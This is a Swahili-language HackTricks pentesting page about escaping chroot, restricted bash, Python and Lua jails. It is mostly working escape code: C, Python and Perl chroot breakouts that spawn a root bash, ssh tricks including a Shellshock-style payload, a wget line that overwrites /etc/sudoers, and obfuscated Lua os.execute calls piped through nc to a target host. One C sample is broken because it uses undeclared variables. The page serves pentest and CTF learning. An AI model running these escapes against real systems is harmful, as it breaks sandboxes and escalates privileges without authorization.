# Kutoroka Kutoka Jela

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **GTFOBins**

**Tafuta kwenye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ikiwa unaweza kutekeleza binary yoyote na mali ya "Shell"**

## Kutoroka kwa Chroot

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot **haukusudiwi kulinda** dhidi ya kuharibiwa kwa makusudi na watumiaji wenye **mamlaka** (**root**). Kwenye mifumo mingi, muktadha wa chroot hauwezi kustack vizuri na programu zilizochrooted **zenye mamlaka ya kutosha zinaweza kufanya chroot ya pili kuvunja**.\
Kawaida hii inamaanisha kwamba ili kutoroka unahitaji kuwa root ndani ya chroot.

{% hint style="success" %}
**Zana** [**chw00t**](https://github.com/earthquake/chw00t) ilitengenezwa kwa kudhuru mazingira yafuatayo na kutoroka kutoka `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Ikiwa wewe ni **root** ndani ya chroot unaweza **kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot 2 haziwezi kuwepo pamoja (kwenye Linux), hivyo ikiwa unajenga folda na kisha **kuunda chroot mpya** kwenye folda hiyo mpya ukiwa **nje yake**, sasa utakuwa **nje ya chroot mpya** na hivyo utakuwa kwenye FS.

Hii hutokea kwa sababu kawaida chroot HAIHAMISHI saraka yako ya kufanyia kazi kwenye ile iliyoelekezwa, hivyo unaweza kuunda chroot lakini uwe nje yake.
{% endhint %}

Kawaida hutapata binary ya `chroot` ndani ya jela ya chroot, lakini **unaweza kuchanganya, kupakia na kutekeleza** binary: 

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Kipanya</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Hii ni sawa na kesi iliyopita, lakini katika kesi hii **mshambuliaji hifadhi file descriptor kwa saraka ya sasa** na kisha **anajenga chroot katika saraka mpya**. Hatimaye, kwa kuwa ana **upatikanaji** wa **FD** **nje** ya chroot, anapata na **kutoroka**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD inaweza kupitishwa juu ya Unix Domain Sockets, hivyo:

* Unda mchakato wa mtoto (fork)
* Unda UDS ili mzazi na mtoto waweze kuzungumza
* Endesha chroot katika mchakato wa mtoto katika saraka tofauti
* Katika mchakato wa mzazi, unda FD ya saraka ambayo iko nje ya chroot mpya ya mchakato wa mtoto
* Pita kwa mtoto FD hiyo kutumia UDS
* Mchakato wa mtoto chdir kwa FD hiyo, na kwa sababu iko nje ya chroot yake, atatoka gerezani
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Kufunga kifaa cha mzizi (/) ndani ya saraka ndani ya chroot
* Kuingia chroot katika saraka hiyo

Hii inawezekana katika Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Funga procfs ndani ya saraka ndani ya chroot (ikiwa bado haijafanyika)
* Tafuta pid ambayo inaingia tofauti ya mzizi/cwd, kama: /proc/1/root
* Chroot katika kuingia hiyo
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Unda Fork (mchakato wa mtoto) na chroot katika saraka tofauti zaidi katika FS na CD juu yake
* Kutoka kwa mchakato wa mzazi, hamisha saraka ambapo mchakato wa mtoto yuko katika saraka kabla ya chroot ya watoto
* Mchakato hawa watoto watapata wenyewe nje ya chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Zamani watumiaji wangeweza kudebugi michakato yao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii sio inawezekana kwa chaguo-msingi tena
* Hata hivyo, ikiwa inawezekana, unaweza ptrace katika mchakato na kutekeleza shellcode ndani yake ([angalia mfano huu](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Uchambuzi

Pata habari kuhusu gereza:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Badilisha PATH

Angalia kama unaweza kubadilisha mazingira ya PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim
```bash
:set shell=/bin/sh
:shell
```
### Unda skripti

Angalia kama unaweza kuunda faili inayoweza kutekelezwa na _/bin/bash_ kama yaliyomo
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kutoka SSH

Ikiwa unatumia ssh unaweza kutumia hila hii kutekeleza bash shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Tangaza
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Unaweza kubadilisha mfano faili ya sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Mbinu Nyingine

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Pia inaweza kuwa ya kuvutia ukurasa:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Mbinu za kutoroka kutoka kwa jela za python zinapatikana kwenye ukurasa ufuatao:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Kwenye ukurasa huu unaweza kupata kazi za jumla unazo ufikia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval na utekelezaji wa amri:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Baadhi ya mbinu za **kuita kazi za maktaba bila kutumia alama za mshono**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Panga kazi za maktaba:
```bash
for k,v in pairs(string) do print(k,v) end
```
Tafadhali kumbuka kila unapotekeleza amri ya mstari mmoja iliyotangulia katika **mazingira tofauti ya lua, mpangilio wa kazi hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza kazi moja maalum unaweza kufanya shambulio la nguvu kwa kupakia mazingira tofauti ya lua na kuita kazi ya kwanza ya maktaba:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata ganda la lua la kuingiliana**: Ikiwa uko ndani ya ganda la lua lililopunguzwa unaweza kupata ganda jipya la lua (na kwa matumaini lisilopunguzwa) kwa kuita:
```bash
debug.debug()
```
## Marejeo

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Majadiliano: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
